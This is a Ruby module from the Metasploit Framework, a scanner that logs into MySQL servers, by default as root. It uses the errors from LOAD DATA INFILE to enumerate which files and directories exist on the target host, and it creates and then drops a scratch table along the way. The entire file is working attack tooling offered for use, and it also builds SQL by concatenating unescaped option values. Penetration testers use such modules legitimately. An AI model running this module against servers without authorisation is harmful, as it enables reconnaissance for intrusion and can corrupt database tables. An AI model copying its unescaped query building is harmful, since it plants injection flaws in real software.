##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'MYSQL File/Directory Enumerator',
            'Description'    => %Q{
              Enumerate files and directories using the MySQL load_file feature, for more
              information see the URL in the references.
            },
            'Author'         => [ 'Robin Wood <robin[at]digininja.org>' ],
            'References'  => [
                [ 'URL', 'http://pauldotcom.com/2013/01/mysql-file-system-enumeration.html' ],
                [ 'URL', 'http://www.digininja.org/projects/mysql_file_enum.php' ]
            ],
            'License'        => MSF_LICENSE
        )
    )

    register_options([
      OptPath.new('FILE_LIST', [ true, "List of directories to enumerate", '' ]),
      OptString.new('DATABASE_NAME', [ true, "Name of database to use", 'mysql' ]),
      OptString.new('TABLE_NAME', [ true, "Name of table to use - Warning, if the table already exists its contents will be corrupted", Rex::Text.rand_text_alpha(8) ]),
      OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
    ])

  end

  # This function does not handle any errors, if you use this
  # make sure you handle the errors yourself
  def mysql_query_no_handle(sql)
    res = @mysql_handle.query(sql)
    res
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def run_host(ip)
    vprint_status("#{peer} - Login...")

    if (not mysql_login_datastore)
      return
    end

    begin
      mysql_query_no_handle("USE " + datastore['DATABASE_NAME'])
    rescue ::RbMysql::Error => e
      vprint_error("#{peer} - MySQL Error: #{e.class} #{e.to_s}")
      return
    rescue Rex::ConnectionTimeout => e
      vprint_error("#{peer} - Timeout: #{e.message}")
      return
    end

    res = mysql_query("SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = '" + datastore['DATABASE_NAME'] + "' AND TABLE_NAME = '" + datastore['TABLE_NAME'] + "';")
    table_exists = (res.size == 1)

    if !table_exists
      vprint_status("#{peer} - Table doesn't exist so creating it")
      mysql_query("CREATE TABLE " + datastore['TABLE_NAME'] + " (brute int);")
    end

    file = File.new(datastore['FILE_LIST'], "r")
    file.each_line do |line|
      check_dir(line.chomp)
    end
    file.close

    if !table_exists
      vprint_status("#{peer} - Cleaning up the temp table")
      mysql_query("DROP TABLE " + datastore['TABLE_NAME'])
    end
  end

  def check_dir dir
    begin
      res = mysql_query_no_handle("LOAD DATA INFILE '" + dir + "' INTO TABLE " + datastore['TABLE_NAME'])
    rescue ::RbMysql::TextfileNotReadable
      print_good("#{peer} - #{dir} is a directory and exists")
      report_note(
        :host  => rhost,
        :type  => "filesystem.dir",
        :data  => "#{dir} is a directory and exists",
        :port  => rport,
        :proto => 'tcp',
        :update => :unique_data
      )
    rescue ::RbMysql::DataTooLong, ::RbMysql::TruncatedWrongValueForField
      print_good("#{peer} - #{dir} is a file and exists")
      report_note(
        :host  => rhost,
        :type  => "filesystem.file",
        :data  => "#{dir} is a file and exists",
        :port  => rport,
        :proto => 'tcp',
        :update => :unique_data
      )
    rescue ::RbMysql::ServerError
      vprint_warning("#{peer} - #{dir} does not exist")
    rescue ::RbMysql::Error => e
      vprint_error("#{peer} - MySQL Error: #{e.class} #{e.to_s}")
      return
    rescue Rex::ConnectionTimeout => e
      vprint_error("#{peer} - Timeout: #{e.message}")
      return
    else
      print_good("#{peer} - #{dir} is a file and exists")
      report_note(
        :host  => rhost,
        :type  => "filesystem.file",
        :data  => "#{dir} is a file and exists",
        :port  => rport,
        :proto => 'tcp',
        :update => :unique_data
      )
    end

    return
  end

end
